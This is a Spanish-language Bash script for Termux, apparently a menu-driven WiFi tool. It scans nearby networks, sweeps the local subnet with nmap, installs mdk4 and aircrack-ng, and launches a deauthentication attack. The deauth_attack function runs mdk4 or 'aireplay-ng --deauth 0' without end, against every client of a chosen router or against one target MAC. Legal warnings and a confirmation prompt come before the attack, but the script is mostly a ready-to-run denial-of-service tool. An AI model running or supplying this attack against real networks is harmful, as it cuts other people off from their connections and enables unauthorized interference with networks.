#!/data/data/com.termux/files/usr/bin/bash
# -*- coding: utf-8 -*-

# =============================================
# TERMUX NETWORK MANAGER v2.0
# Gestión avanzada de redes WiFi
# Incluye función de deauthentication
# =============================================

# Configuración de encoding
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

# Colores para la interfaz
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Variables globales
DEAUTH_PID=""
CURRENT_DIR="$(pwd)"

# Detectar soporte Unicode
detect_unicode_support() {
    echo -e "\xe2\x9c\x93" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        CHECK_MARK="✓"
        CROSS_MARK="✗"
        WARNING_MARK="⚠"
        ARROW_RIGHT="→"
        return 0
    else
        CHECK_MARK="[OK]"
        CROSS_MARK="[ERROR]" 
        WARNING_MARK="[!]"
        ARROW_RIGHT="->"
        return 1
    fi
}

# Función para mostrar banner
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║           TERMUX NETWORK MANAGER         ║"
    echo "║                 v2.0                     ║"
    echo "║    Gestión Avanzada de Redes WiFi        ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  USO ÉTICO Y LEGAL REQUERIDO${NC}"
    echo -e "${YELLOW}Solo para redes propias o con autorización${NC}"
    echo ""
}

# Función para verificar e instalar dependencias
check_dependencies() {
    echo -e "${BLUE}[*] Verificando dependencias...${NC}"
    
    pkg update -y > /dev/null 2>&1
    
    local packages=("nmap" "git" "python" "tcpdump" "curl")
    
    for pkg in "${packages[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            echo -e "${YELLOW}[!] Instalando $pkg...${NC}"
            pkg install "$pkg" -y > /dev/null 2>&1
        fi
    done
    
    echo -e "${GREEN}[+] Dependencias básicas verificadas${NC}"
}

# Función para instalar herramientas de pentesting
install_pentest_tools() {
    echo -e "${MAGENTA}[*] Instalando herramientas de pentesting...${NC}"
    
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${YELLOW}[!] Instalando mdk4...${NC}"
        pkg install root-repo -y > /dev/null 2>&1
        pkg install mdk4 -y > /dev/null 2>&1
    fi
    
    if ! command -v aireplay-ng &> /dev/null; then
        echo -e "${YELLOW}[!] Instalando aircrack-ng...${NC}"
        pkg install aircrack-ng -y > /dev/null 2>&1
    fi
    
    echo -e "${GREEN}[+] Herramientas de pentesting instaladas${NC}"
}

# Función para escanear redes WiFi
scan_wifi() {
    echo -e "${BLUE}[*] Escaneando redes WiFi disponibles...${NC}"
    echo -e "${YELLOW}════════════════════════════════════════${NC}"
    
    if command -v termux-wifi-scaninfo &> /dev/null; then
        local scan_result
        scan_result=$(termux-wifi-scaninfo)
        
        if [ -n "$scan_result" ]; then
            echo "$scan_result" | grep -E 'ssid|bssid|rssi|channel' | \
            while IFS= read -r line; do
                if [[ $line == *"ssid"* ]]; then
                    echo -e "${GREEN}$line${NC}"
                elif [[ $line == *"bssid"* ]]; then
                    echo -e "${CYAN}$line${NC}"
                elif [[ $line == *"rssi"* ]]; then
                    echo -e "${YELLOW}$line${NC}"
                else
                    echo "$line"
                fi
            done
        else
            echo -e "${RED}[!] No se encontraron redes WiFi${NC}"
        fi
    else
        echo -e "${RED}[!] termux-wifi-scaninfo no disponible${NC}"
        echo -e "${YELLOW}Instala Termux:API desde F-Droid${NC}"
    fi
    
    echo -e "${YELLOW}════════════════════════════════════════${NC}"
}

# Función para escanear dispositivos en la red
scan_network() {
    echo -e "${BLUE}[*] Escaneando dispositivos en la red...${NC}"
    
    local IP=$(ip route get 1 2>/dev/null | awk '{print $7;exit}')
    if [ -z "$IP" ]; then
        echo -e "${RED}[!] No se pudo detectar la IP local${NC}"
        return 1
    fi
    
    local NETWORK="${IP%.*}.0/24"
    echo -e "${YELLOW}Red: $NETWORK${NC}"
    echo -e "${CYAN}Escaneo en progreso...${NC}"
    
    if command -v nmap &> /dev/null; then
        nmap -sn "$NETWORK" | while IFS= read -r line; do
            if [[ $line == *"Nmap scan report"* ]]; then
                local ip=$(echo "$line" | awk '{print $5}')
                echo -e "${GREEN}📱 Dispositivo: $ip${NC}"
            elif [[ $line == *"MAC Address"* ]]; then
                local mac=$(echo "$line" | awk '{print $3}')
                local vendor=$(echo "$line" | cut -d' ' -f4-)
                echo -e "   ${CYAN}MAC: $mac${NC}"
                echo -e "   ${YELLOW}Vendor: $vendor${NC}"
                echo ""
            fi
        done
    else
        echo -e "${RED}[!] nmap no está instalado${NC}"
    fi
}

# Función para expulsar dispositivo de la red (DEAUTH ATTACK)
deauth_attack() {
    echo -e "${MAGENTA}"
    echo "╔══════════════════════════════════════════╗"
    echo "║             DEAUTH ATTACK                ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${RED}🚨 ADVERTENCIA LEGAL IMPORTANTE:${NC}"
    echo -e "${RED}• Esta operación puede ser ILEGAL en tu país${NC}"
    echo -e "${RED}• Solo para redes propias o con autorización${NC}"
    echo -e "${RED}• Eres responsable del uso que le des${NC}"
    echo -e "${YELLOW}════════════════════════════════════════${NC}"
    
    read -p "¿Continuar? (s/n): " confirm
    if [[ $confirm != "s" && $confirm != "S" ]]; then
        echo -e "${YELLOW}[*] Operación cancelada${NC}"
        return
    fi
    
    # Escanear redes disponibles
    scan_wifi
    
    echo -e "${CYAN}[*] Información requerida:${NC}"
    read -p "BSSID del router: " bssid
    read -p "Canal (channel): " channel
    read -p "MAC del dispositivo (opcional - para ataque específico): " target_mac
    
    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo -e "${RED}[!] BSSID y canal son obligatorios${NC}"
        return
    fi
    
    # Validar formato MAC si se proporciona
    if [ -n "$target_mac" ] && [[ ! "$target_mac" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        echo -e "${RED}[!] Formato MAC inválido${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Iniciando ataque de deauthentication...${NC}"
    
    if command -v mdk4 &> /dev/null; then
        echo -e "${GREEN}[+] Usando mdk4${NC}"
        
        if [ -z "$target_mac" ]; then
            echo -e "${CYAN}[*] Modo: Ataque a todos los dispositivos${NC}"
            mdk4 wlan0 d -b "$bssid" -c "$channel" &
        else
            echo -e "${CYAN}[*] Modo: Ataque específico a $target_mac${NC}"
            mdk4 wlan0 d -b "$bssid" -c "$channel" -m "$target_mac" &
        fi
        
        DEAUTH_PID=$!
        
    elif command -v aireplay-ng &> /dev/null; then
        echo -e "${GREEN}[+] Usando aireplay-ng${NC}"
        
        # Intentar modo monitor
        airmon-ng start wlan0 > /dev/null 2>&1
        
        if [ -z "$target_mac" ]; then
            aireplay-ng --deauth 0 -a "$bssid" wlan0mon &
        else
            aireplay-ng --deauth 0 -a "$bssid" -c "$target_mac" wlan0mon &
        fi
        
        DEAUTH_PID=$!
        
    else
        echo -e "${RED}[!] No se encontraron herramientas de deauthentication${NC}"
        echo -e "${YELLOW}Instala mdk4 o aircrack-ng primero${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Ataque iniciado (PID: $DEAUTH_PID)${NC}"
    echo -e "${YELLOW}⚠️  Presiona Ctrl+C para detener el ataque${NC}"
    
    # Manejar interrupción
    trap 'stop_deauth' INT
    wait
}

# Función para detener deauthentication
stop_deauth() {
    echo -e "\n${RED}[!] Deteniendo ataque...${NC}"
    
    if [ -n "$DEAUTH_PID" ]; then
        kill "$DEAUTH_PID" 2>/dev/null
        echo -e "${GREEN}[+] Ataque detenido${NC}"
    fi
    
    # Detener modo monitor si estaba activo
    airmon-ng stop wlan0mon 2>/dev/null
    
    DEAUTH_PID=""
}

# Función para detener todos los ataques
stop_all_attacks() {
    echo -e "${RED}[*] Deteniendo todos los ataques...${NC}"
    
    pkill -f "mdk4" 2>/dev/null
    pkill -f "aireplay-ng" 2>/dev/null
    pkill -f "airmon-ng" 2>/dev/null
    
    airmon-ng stop wlan0mon 2>/dev/null
    airmon-ng stop wlan0 2>/dev/null
    
    DEAUTH_PID=""
    echo -e "${GREEN}[+] Todos los ataques detenidos${NC}"
}

# Función para información del sistema
system_info() {
    echo -e "${BLUE}[*] Información del sistema${NC}"
    echo -e "${YELLOW}════════════════════════════════════════${NC}"
    
    echo -e "${GREEN}● Información de Termux:${NC}"
    termux-info
    
    echo -e "${GREEN}● Herramientas disponibles:${NC}"
    local tools=("mdk4" "aireplay-ng" "nmap" "tcpdump")
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "  ${CHECK_MARK} $tool: $(which $tool)"
        else
            echo -e "  ${CROSS_MARK} $tool: No instalado"
        fi
    done
}

# Menú principal
show_menu() {
    while true; do
        show_banner
        
        echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║               MENÚ PRINCIPAL              ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}1. ${ARROW_RIGHT} Escanear redes WiFi${NC}"
        echo -e "${GREEN}2. ${ARROW_RIGHT} Escanear dispositivos en red${NC}"
        echo -e "${MAGENTA}3. ${ARROW_RIGHT} Deauth Attack (Expulsar dispositivos)${NC}"
        echo -e "${RED}4. ${ARROW_RIGHT} Detener todos los ataques${NC}"
        echo -e "${YELLOW}5. ${ARROW_RIGHT} Instalar herramientas pentesting${NC}"
        echo -e "${BLUE}6. ${ARROW_RIGHT} Información del sistema${NC}"
        echo -e "${CYAN}7. ${ARROW_RIGHT} Actualizar dependencias${NC}"
        echo -e "${RED}8. ${ARROW_RIGHT} Salir${NC}"
        echo ""
        echo -e "${YELLOW}════════════════════════════════════════${NC}"
        
        read -p "Selecciona una opción (1-8): " choice
        
        case $choice in
            1) scan_wifi ;;
            2) scan_network ;;
            3) deauth_attack ;;
            4) stop_all_attacks ;;
            5) install_pentest_tools ;;
            6) system_info ;;
            7) check_dependencies ;;
            8) 
                stop_all_attacks
                echo -e "${GREEN}[+] ¡Hasta luego!${NC}"
                exit 0
                ;;
            *) 
                echo -e "${RED}[!] Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "Presiona Enter para continuar..."
    done
}

# Función principal
main() {
    # Detectar Unicode al inicio
    detect_unicode_support
    
    # Verificar que estamos en Termux
    if [ ! -d "/data/data/com.termux/files/usr" ]; then
        echo -e "${RED}[!] Este script debe ejecutarse en Termux${NC}"
        exit 1
    fi
    
    # Verificar root (opcional)
    if [ "$(whoami)" = "root" ]; then
        echo -e "${GREEN}[+] Ejecutando como root${NC}"
    else
        echo -e "${YELLOW}[!] Algunas funciones pueden requerir root${NC}"
    fi
    
    # Verificar dependencias
    check_dependencies
    
    # Mostrar menú
    show_menu
}

# Manejar señales de interrupción
trap stop_all_attacks EXIT
trap stop_all_attacks INT

# Ejecutar función principal
main "$@"
